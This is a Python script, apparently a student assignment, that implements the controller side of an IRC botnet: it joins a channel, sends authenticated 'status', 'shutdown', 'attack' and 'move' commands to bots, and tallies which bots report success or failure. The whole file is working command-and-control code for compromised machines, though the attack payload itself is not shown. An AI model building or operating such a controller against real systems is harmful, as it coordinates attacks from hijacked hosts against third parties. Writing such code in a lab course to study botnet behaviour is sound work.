#!/usr/bin/env python3
# Adam Shaw UCID:30204315

import sys
import socket
import time
import hashlib
import select
import random
import string

def compute_mac(nonce, secret):
    data = nonce + secret
    return hashlib.sha256(data.encode()).hexdigest()[:8]

def send_irc(sock, message):
    sock.sendall((message + "\r\n").encode())

def send_command(sock, channel, command_parts, secret):
    nonce = str(int(time.time() * 1000))
    mac = compute_mac(nonce, secret)
    full_command = f"{nonce} {mac} " + " ".join(command_parts)
    send_irc(sock, f"PRIVMSG {channel} :{full_command}")

def gather_replies(sock, channel): # listens for incoming chat data
    replies = []
    buffer = ""
    end_time = time.time() + 5.0
    
    sock.setblocking(0)
    print("Waiting 5s to gather replies.")
    while time.time() < end_time:
        ready = select.select([sock], [], [], 0.1)
        if ready[0]:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                buffer += data.decode()
                while '\r\n' in buffer:
                    line, buffer = buffer.split('\r\n', 1)
                    if line.startswith("PING"):
                        send_irc(sock, line.replace("PING", "PONG", 1))
                    elif "PRIVMSG" in line:
                        parts = line.split(":", 2)
                        if len(parts) >= 3:
                            msg_content = parts[2].strip()
                            if msg_content.startswith("-"): # filters the chat room
                                replies.append(msg_content)
            except Exception:
                pass
    sock.setblocking(1)
    return replies

def main():
    if len(sys.argv) != 4:
        sys.exit(1)
        
    target = sys.argv[1]
    channel = sys.argv[2]
    secret = sys.argv[3]
    
    host, port = target.split(':')
    port = int(port)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        nick = "ctrl_" + "".join(random.choices(string.ascii_lowercase, k=4))
        send_irc(s, f"NICK {nick}")
        send_irc(s, f"USER {nick} 0 * :controller")
        time.sleep(1)
        send_irc(s, f"JOIN {channel}")
    except Exception:
        print("Failed to connect.")
        sys.exit(1)
        
    while True:
        try:
            cmd_input = input("cmd> ").strip()
        except EOFError:
            break
            
        if not cmd_input:
            continue
            
        parts = cmd_input.split()
        cmd = parts[0]
        
        if cmd == "quit":
            print("Disconnected.")
            break
            
        if cmd not in ["status", "shutdown", "attack", "move"]:
            print("Unknown command.")
            continue
            
        send_command(s, channel, parts, secret)
        replies = gather_replies(s, channel)
        
        if cmd == "status":
            bots = []
            for r in replies:
                if r.startswith("-status"):
                    tokens = r.split()
                    if len(tokens) >= 3:
                        bots.append(f"{tokens[1]} ({tokens[2]})")
            print(f"Result: {len(bots)} bots replied.")
            if bots:
                print(", ".join(bots))
                
        elif cmd == "shutdown":
            bots = []
            for r in replies:
                if r.startswith("-shutdown"):
                    tokens = r.split()
                    if len(tokens) >= 2:
                        bots.append(tokens[1])
            print(f"Result: {len(bots)} bots shut down.")
            if bots:
                print(", ".join(bots))
                
        elif cmd == "attack":
            successes = []
            failures = []
            for r in replies:
                if r.startswith("-attack"):
                    tokens = r.split(maxsplit=3)
                    if len(tokens) >= 3:
                        bnick = tokens[1]
                        status = tokens[2]
                        if status == "OK":
                            successes.append(bnick)
                        elif status == "FAIL" and len(tokens) >= 4:
                            failures.append(f"{bnick}: {tokens[3]}")
            
            print(f"Result: {len(successes)} bots attacked successfully:")
            if successes:
                print(", ".join(successes))
            print(f"{len(failures)} bots failed to attack:")
            for f in failures:
                print(f)
                
        elif cmd == "move":
            bots = []
            for r in replies:
                if r.startswith("-move"):
                    tokens = r.split()
                    if len(tokens) >= 2:
                        bots.append(tokens[1])
            print(f"Result: {len(bots)} bots moved.")
            if bots:
                print(", ".join(bots))

if __name__ == "__main__":
    main()